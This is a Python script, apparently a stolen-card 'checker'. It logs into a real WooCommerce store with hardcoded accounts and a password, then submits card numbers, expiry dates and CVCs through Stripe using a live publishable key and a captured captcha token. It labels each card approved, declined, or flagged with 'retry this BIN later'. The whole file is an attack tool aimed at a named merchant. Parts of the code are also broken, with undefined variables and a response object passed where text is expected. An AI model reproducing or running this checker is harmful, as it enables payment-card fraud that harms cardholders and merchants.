import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def st(ccx):
	import requests
	ccx = y.strip().split('\n')[0]
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	acc = ['medjdjdj882ro@gmail.com','merospam00@gmail.com','mero00spam00@gmail.com','mero00spam00@gmail.com']
	time.sleep(9)
	email = random.choice(acc)
	print(F+email)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	data = {
    'username': email,
    'password': 'A@Amir5520055',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}

	response = r.post(
	    'https://thefloordepot.com.au/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	time.sleep(9)
	headers = {'user-agent': user}
	data = f'type=card&owner[name]=+&owner[email]={email}&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fd6c82e4-dc3a-45f0-94f6-fd9a4e71ba50e29d22&muid=f3e26d94-2e55-4062-b4f0-19f14192506a71c920&sid=c11f9c06-17e1-4ae9-a386-e4af1a2eab4672a908&pasted_fields=number&payment_user_agent=stripe.js%2Fddbd33ac04%3B+stripe-js-v3%2Fddbd33ac04%3B+split-card-element&referrer=https%3A%2F%2Fthefloordepot.com.au&time_on_page=20013&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiN1dzWGtGNEE3WTBob0ExcUJJRDVFd0IrR0VabUQzaGJVcGxrK3o5NTRQZFNxaDNDU0ptaFFBelB0YWlSME5RMnIvWFFtdDloaG1GcWZ6S2ZkbU92bEpIaEVVaXgxVm03alUwUE9QOXBLaEJpYU1HbVhENDB0b1BlQm1QcFNUbzEzbm8xd1Q2MWFvUGNjd2ZXRmhXTUdqZmUvVDJvalJrS1VlQVhHMlk4YXJtQXhvYmo4NmUydld4RU9VUmJWQWRXSFQzaUo0QktwbEZ4eUVYaCtnQjUyZWdrOUV0by8rbXNiRWVXamxad2RzZGtkRUdKZVlQdGdwYmNuYkZhcU5DeWV1c2ptZG1EQ0xTL3JqS1k0VGVWdTNOQ0RPTjJWU0VFczkyME9PRFliU01aWjh3OGxZK25QSVBWRFpBU3N3bndIRVhEcEtUeE9mT0hWRW5JZzdOUCtNOXhUV1V0dHZYYWhvWEdxUFJBSlpiL2xYZlQ2blFIWUpnZEJrNmcrVVVtUEZ5Y3Q1d1lCZHd0dEljbjFPQ2hUOHpraklpVlJWaDd6SjBXUjJFOE12S09lNDIxTVZIRW4zQUUybjZJR2toTVYxZVJBK1VaSWRuaHNYamw4WTRWaHMyMXFBell6bE9iQ3k1cnE3R3VUWEIzUHo2SzZZYWswQnFFcjczdUdnb1o0U25JQVlyMlhTdGhkZjhWSWNYSzRLNnVRbGwrSGN4Y0xQZXM1NUZXYjJHZFdWU1RUSWRROEJYMXZyRnBiOVIxS3NYV0ZCRm1jcFM3VG1kRC9lZW9tL0tTT2R5aktyZHZiVWlPVlVwNmg1UEc2VWVsU2JBdGtaeEk2enR0aG5QZVBCM1BsSGZwRWhCNGxLQ0VQcDNDY1F6SUM3Qll1dE5HcTdLcGpSRm15S0RwNWFxWTZCUlhDKzJjYWNVNVpmWGVXdkZ6R1k5VmN5VEN2ZjBPb0pxZXBzUkFQZi83RnVqNWxCbkYwNW5OL2RFSllUVklHTDdDM0RlMmNHUkxrTjVHdGdwbnBMaVVwbkk2a0x4U0RCNlNiZnU4SXY4NnJlSTNiTDd3MVBDWmV3bXdhN2hheFNZalNQeWQ4YlYzdTVYQk82V0NORGZHbmV6NS9KMlVDRzdDbHdpREpDM3Q0Z0MxalI4ZVpxbTBTRGtweTkwdkZWNFlFaVRuQ1BpZnZmQUNybEcrWVBDb2doM0I2YnNOSksvTnRhZU9GQnBwOVhhdkEvbkRobWU1QUtvNFoxS0tEU1B0WVZTOWhhd0tQM21mL0NuSkJBQktENnBVUGwvWDdGQzJjWTFkYUMrMk5SdUxPZHYzQmNIc0pONzVnallWUFBOSzhkZ2JvS0hYMU15cWp0VityMlc1VnhyallUZWNoVHk5dzYwcldTc29QMjBBT0ZEK3NGenh0RHZtcFRvLzNqdjFzVGx2Rm5CbWVUcUNYNDBTcFVZQzdRcmZONlh6enk4MjdFSExBRzVTMGk5d2hLOGQ2U1RJaWMwanNEdE52NUVUcEVPa0hPS1lmMm02alVIcnMxSWlBcElSNHhlRHc4dUNzLzJ4TDNTYTcxYStiK1FVc040MWFyaHEvOTY1aDJKNGZualRoOXhuZld5ZUJXc3YzY0RLdnpBYU5GNXBtd2djTEJLcEpUYlhaWHE3M0xhVkxMR25JeEJ3bTBCQ1Z3d2JESjhIY1hxWXlwSDNiV2U3WVFhN3RES2xFOGxQdVFCL1p0UHhtVnlLSFhGQTRLK0o4MitUdzZzSnd2MjRXZDY2dWdrREJobGY0SUNHN0QyNkxiUmt5YWhYVTBaNlhQZlVyT0FDeXdBSTJ1bUMzT2F1L0huUXVFSXBxeVUxSGRyMFJwMGRBYkZ1ZFdzaTZIOTdoVVZ6NVRTS04vcitQUTVweU1KbVh4K3p2ZkVITTFxZzZLeUoxcVZyaUxFWDFZQnYwYmdxT0YrYlpkb1BnOGprMG5IYkYvYUVZK0VPL1ZVb00wcHdwN0o0QmdWSThteUZiQmFheFd1eHdZaXBwU2VVY3JScDlmK052dVVaOUtvLzNDNjh0dWd3THdKVUo1cTZjWmFqSGs3akNNV2Yzcm5JdzlpSEJ4bG02SUd6SDFiOVZMWExMOGFvM2VHVHY1VHFtKzFrQXkzZ3BxTmlyMDJGQXNUU2xoUTF1TWRUci9SQU8xeDhiQTFCbTFXdmFFZW0xOXQvTzRhaFRza1hXemJuUWJySGdsWW5ORDZUcS9PS3ZLQkxYY1V4TitwUmF6QXhXOXVwUGU5RnJwcW1VN040eGMzV3RLS1EvVDFycjBDZU5BcG1MRll3TnNxRDhXUVNkdGw3SEJpdVFUM0dJSUVVQzN1eEo5djhheW50OWJnQkVQNHV5MEJCK2xYWkhaWllhTnlXS1JLS3NHdFk2Q1grZnNMMzhOZktzVXhaa2pLSEw4RFpoSTZJR3ZFbzZ5eUNYcDRhTis0TmhPMHNyeXlteHBibGwxdEZ3aGxON1NwWWZuV216d1V0UHp5dlVoRFhRbTVFdWplb055TmVQZGMvdks1NEJqR2tOVFZKOE9kTThDbEJpdWRHVXptOGFYVHA5dFpLOWtVWHpoYm4wRGhkZHRWeHYyWTFqREZtak1EbFI5QXNlTzhBck9mbGVhTWRDMEt1WnAzYlIzNS92MlFLdVNSNFUxTXhvMDh6R04wdWNFZVpTMFBZalltU0dNaGsxNDlvdEswTEdKM2o3U1gwbFlGakFENVFjWm4yVUpvQTNLdUhwaWRvc3VyT29NeU9kdXBFMDN5c1pKZ25pUTZ5L1FrNitJUTVvaW9nMVJrPSIsImV4cCI6MTcyNDU4MDc4NCwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjI1NjNlN2I1IiwicGQiOjAsImNkYXRhIjoianVaOHFkUjFCTTRKbmxWYk1zZ3IrdDd1SFBPSjJSRWZTeDBUUnZwczVrUzJscWJFZXBJTTgxa1d2UndlWVp2QjNaNTQ1elk3c2lwa0hraXRkLzduRFBPOTFZRFY2MTZQU0s4c3k0L2YyWnRjZ0RvVzFnRmFDL05KcEp3QXNJbGU0TnBFUkg2cVBUVmppaEVUTytjY0xrYmJSN3N5d2d1Zjd1SlVIY1RySGhzUW1sMURTU2p6Z0JlQmw3cXNCa2w4aWMxWldrT3pEL2tFY0IxNCJ9.eYslvansSLiqSPUBQ80pqqiQXbk7QTS3nlOK8EDxQxA&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
	response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
	if not 'id' in response.json():
	   print('ERORR CARD')
	else:
		id=response.json()['id']

	headers = {'user-agent': user}
	
	params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}
	data = {
    'stripe_source_id': id,
    'nonce': nonce,
}
	
	r3 = r.post(
	    'https://thefloordepot.com.au/',
	    params=params,
	    headers=headers,
	    data=data,
	)
	

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	
	text = r3
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'Success' in result or 'successfully' in result or 'thank you' in result or 'thanks' in result or 'approved' in result or 'fund' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
	
